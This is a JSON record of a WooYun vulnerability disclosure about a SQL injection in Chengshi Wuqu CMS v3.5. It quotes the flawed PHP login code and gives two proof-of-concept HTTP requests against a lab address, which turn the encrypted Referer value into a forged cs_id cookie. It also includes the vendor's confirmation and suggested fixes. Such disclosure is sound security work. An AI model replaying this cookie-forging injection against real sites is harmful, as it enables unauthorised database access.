{"id": 49704, "wybug_id": "wooyun-2014-080370", "wybug_title": "程氏舞曲CMS某泄露，导致sql注入", "wybug_corp": "chshcms.com", "wybug_author": "路人甲", "wybug_date": "2014-10-27 10:48", "wybug_open_date": "2015-01-25 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向公众公开  简要描述： 程氏舞曲CMS某泄露，导致严重问题 详细说明：  这个厂商非常给力，作为白帽子，也非常乐意～！cookie加密后的字符泄漏。可以替换其他字段，导致SQL等，严重漏洞。文件：C:\\WWW\\cscms_v3.5_utf8\\app\\controllers\\open.php\n//第三方登入入口\tpublic function login()\t{              if(CS_Appmode==2) exit($this->CsdjSkins->Msg_url('第三方登入已经关闭！',Web_Path));              $urldata['log_fhurl']=$_SERVER['HTTP_REFERER'];//泄漏点              $urldata['log_state']=md5(uniqid(rand(), TRUE)); //CSRF protection;              $this->session->set_userdata($urldata);              $ac = $this->security->xss_clean($this->uri->segment(3));   //方式              $log_url=\"http://denglu.chshcms.com/denglu?ac=\".$ac.\"&appid=\".CS_Appid.\"&redirect_uri=\".site_url(\"open/callback\").\"&state=\".$urldata['log_state'].\"&getdate=\".time();              header(\"Location: $log_url\"); \t}\n我们提交如下，看一下，程序加密后的字符。\nGET /cscms_v3.5_utf8/index.php/open/login/qq HTTP/1.1Host: 192.168.1.201User-Agent: Mozilla/5.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enAccept-Encoding: gzip,deflateAccept-Charset: GB2312,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-aliveReferer: xxoo'\n\n\n可以看到加密后的字符：log_fhurl=L8kxDzdqKNy9%2F2Qs0g利用这个功能，加密我们想要的任意代码。替换其他地方就构成注入。\nGET /cscms_v3.5_utf8/index.php/user/ulog/index/user HTTP/1.1Host: 192.168.1.201User-Agent: Mozilla/5.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enAccept-Encoding: gzip,deflateAccept-Charset: GB2312,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-aliveReferer: http://192.168.1.201/cscms_v3.5_utf8/index.php/user/Cookie: cs_id=L8kxDzdqKNy9%2F2Qs0g\n\n\n   漏洞证明：  \n\n   修复方案：  方案1：加密过程加入字段的判断，使得不能替换使用方案2：调用cookie的后，在 addslashes 一下。或者有其他办法，共同进步。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-27 12:04 厂商回复： 经过检测，漏洞确实存在，已经修复，再次感谢您的检测~! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-17 19:48 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  好想法~~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}